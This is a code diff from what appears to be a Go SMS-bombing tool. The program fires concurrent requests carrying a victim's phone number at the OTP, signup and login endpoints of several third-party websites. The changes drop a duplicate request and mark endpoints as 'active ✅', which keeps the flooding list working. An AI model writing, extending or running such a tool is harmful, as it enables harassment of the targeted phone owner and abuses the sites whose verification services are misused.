@@ -251,10 +251,7 @@ func main() {
 		}, ch)  // idon't know ???
 		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
 			"mobile": phone,
-		}, ch) // edit :4/22/2025
-		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // add site
+		}, ch)  // active ✅
  		go sms("https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
@@ -348,7 +345,7 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
 			"phone": phone,
-		}, ch)  // add site just login
+		}, ch)  // active ✅
 		go sms("https://takfarsh.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"username": phone,
 		}, ch)  // edit :4/22/2025
